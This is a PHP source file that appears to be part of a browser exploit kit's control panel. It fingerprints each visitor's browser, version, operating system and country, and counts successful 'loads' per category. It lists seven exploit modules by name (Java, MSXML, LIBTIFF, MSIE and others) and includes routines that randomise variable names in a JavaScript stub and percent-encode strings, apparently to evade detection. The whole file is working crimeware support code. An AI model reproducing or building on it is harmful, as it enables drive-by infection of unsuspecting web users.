<?php
require_once("geoip.php");
function getbrowser() {
	$uainit = $_SERVER['HTTP_USER_AGENT'];
	if ( strstr( $uainit, "Opera" ) )
    {
        return "Opera";
    }
    if ( strstr( $uainit, "Firefox" ) )
    {
        return "Firefox";
    }
    if ( strstr( $uainit, "MSIE" ) )
    {
        return "MSIE";
    }
	if ( strstr( $uainit, "Chrome" ) )
	{
		return "Chrome";	
	}
    return "Other";
}
function getver() {
	$uainit = $_SERVER['HTTP_USER_AGENT'];
	if ( strstr( $uainit, "Opera" ) )
    {
        if ( preg_match( "#Opera/(\\d+\\.?\\d*)#s", $uainit, $mt ) )
        {
	    $OPERAversion=$mt[1];
            return "Opera v{$mt[1]}";
        }
        return "Opera";
    }
    if ( strstr( $uainit, "Firefox" ) )
    {
        if ( preg_match( "#Firefox/(\\d+\\.?\\d*\\.?\\d*)#s", $uainit, $mt ) )
        {
            return "Firefox v{$mt[1]}";
        }
        return "Firefox";
    }
    if ( strstr( $uainit, "MSIE" ) )
    {
        if ( preg_match( "#MSIE (\\d+\\.?\\d*)#s", $uainit, $mt ) )
        {
	    $MSIEversion=$mt[1];
            return "MSIE v{$mt[1]}";
        }
        return "MSIE";
    }
    if ( strstr( $uainit, "Nav" ) || strstr( $uainit, "Netscape" ) )
    {
        return "Netscape";
    }
    if ( strstr( $uainit, "Konqueror" ) )
    {
        return "Konqueror";
    }
    if ( strstr( $uainit, "Safari" ) AND (!(strstr( $uainit, "Chrome" ))) )
    {
        return "Safari";
    }
	if ( strstr( $uainit, "Chrome" ) ) 
	{
		return "Chrome";	
	}
    return "Other"; 	
}
function getOS() {
	$uainit = $_SERVER['HTTP_USER_AGENT'];
	if ( strstr( $uainit, "Windows 95" ) )
    {
        return "Windows 95";
    }
    if ( strstr( $uainit, "Windows 98" ) )
    {
        return "Windows 98";
    }
    if ( strstr( $uainit, "Win 9x 4.9" ) )
    {
        return "Windows ME";
    }
    if ( strstr( $uainit, "Windows NT 4" ) )
    {
        return "Windows NT 4";
    }
    if ( strstr( $uainit, "Windows NT 5.0" ) )
    {
        return "Windows 2000";
    }
    if ( strstr( $uainit, "SV1" ) )
    {
        return "Windows XP SP2";
    }
    if ( strstr( $uainit, "Windows NT 5.1" ) )
    {
        return "Windows XP";
    }
    if ( strstr( $uainit, "Windows NT 5.2" ) )
    {
        return "Windows 2003";
    }
    if ( strstr( $uainit, "Windows NT 6.0" ) )
    {
        return "Windows Vista";
    }
	if ( strstr( $uainit, "Windows NT 6.1") )
	{
		return "Windows 7";	
	}
    if ( strstr( $uainit, "Windows" ) )
    {
        return "Windows";
    }
    if ( strstr( $uainit, "Linux" ) )
    {
        return "Linux";
    }
    if ( strstr( $uainit, "BSD" ) )
    {
        return "*BSD";
    }
    return "Other";
}
function getcountry( )
{
    $geo = geoip_open( "files/GeoIP.dat", GEOIP_STANDARD );
    $cnt = geoip_country_code_by_addr( $geo, $_SERVER['REMOTE_ADDR'] );
    if ( !$cnt )
    {
        $cnt = "-";
    }
    geoip_close( $geo );
    return $cnt;
}
function doprc( $part, $total )
{
    if ( $total == 0 )
    {
        return "0%";
    }
    return round( $part / $total * 100, 2 )."%";
}
function getstats( $col )
{
    $nms = array( );
    $ttl = array( );
    $eed = array( );
    $prc = array( );
	
    $r = mysql_query( "SELECT DISTINCT `{$col}` FROM `stats` ORDER BY `{$col}` ASC" );
    while ( $row = mysql_fetch_row( $r ) )
    {
        $nms[] = $row[0];
        $cnm = addslashes( $row[0] );
        $rt = mysql_query( "SELECT COUNT(*) FROM `stats` WHERE `{$col}`='{$cnm}' ORDER BY `{$col}` ASC" ); 
        $rowt = mysql_fetch_row( $rt );
        $total = $rowt[0];
        $ttl[] = $total;
        $rt = mysql_query( "SELECT COUNT(*) FROM `stats` WHERE `{$col}`='{$cnm}' AND `load`!=0 ORDER BY `{$col}` ASC" );
        $rowt = mysql_fetch_row( $rt );
        $exped = $rowt[0];
        $eed[] = $exped;
        $prc[] = doprc( $exped, $total );
    }
    //array_multisort( $eed, SORT_DESC, $ttl, SORT_DESC, $nms, $prc );
    return array( $nms, $ttl, $eed, $prc );
}

$SPLOITS = array( 1 => "JAVA BYTECODE",  2 => "JDB", 3 => "MSXML", 4 => "LIBTIFF", 5 => "MSIE2012", 6 => "JAVA 7 APPLET", 7 => "JAVA ATOMIC" );

function rndvar( )
			{
				$len = mt_rand( 6, 11 );
    				$chss = "abcdefghijkxy";
    				$chsg = "lmnopqrstuvwz";
				$v = "";
				$i = 0;
				for ( ; $i < $len; $i++ )
					{
						$v .= $i % 2 == 0 ? $chss[mt_rand( 0, strlen( $chss ) - 1 )] : $chsg[mt_rand( 0, strlen( $chsg ) - 1 )];
					}
				if ( mt_rand( 0, 3 ) == 0 )
					{
						$v .= mt_rand( 1, 9 );
    					}
    				return $v;
			}
function ObfuscateVars($input)
	{
		$rn=array();
		$tochange=array("RandomVar12" , "RandomVar11" , "RandomVar10", "RandomVar9", "RandomVar8", "RandomVar7", "RandomVar6", "RandomVar5", "RandomVar4", "RandomVar3", "RandomVar2", "RandomVar1");
				for ($i=1; $i <= 12; $i++ )
				{
					while ($noinarray!=1)
						{
							$current=rndvar( );
							if (!in_array($current, $rn)) 
								{
									$noinarray=1;
									$rn[$i]=$current;
								}
						}
					$noinarray=0;
				}

		return str_replace($tochange, $rn, $input);
	}
	$stub="function RandomVar10(){	RandomVar11 = '';     RandomVar9 = 6; 	RandomVar2=6;	for(RandomVar6=0; RandomVar6 < 10; RandomVar6++) 	{ 		if (RandomVar8 >= 6) {				RandomVar11.toUpperCase();				RandomVar9=RandomVar11.length;										}					}	return RandomVar2;}function RandomVar8(){	RandomVar7='';	RandomVar1=RandomVar7;	RandomVar5=RandomVar8;	RandomVar6=RandomVar10();	RandomVar3='';	RandomVar4=3;	if (RandomVar6.length < 42) {		RandomVar7.replace('', RandomVar3);		RandomVar4++;		RandomVar12 = new Array();		RandomVar12.push(RandomVar3);	}	} ";
function javascript_escape($str) {
	$new_str = '';

	$str_len = strlen($str);
	for($i = 0; $i < $str_len; $i++) {
		$new_str .= '%' . dechex(ord(substr($str, $i, 1)));
	}

	return $new_str;
}
function hsc( $str )
{
    return htmlspecialchars( htmlspecialchars_decode( $str, ENT_QUOTES ), ENT_QUOTES );
}
function generateRandomString($length) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
?>
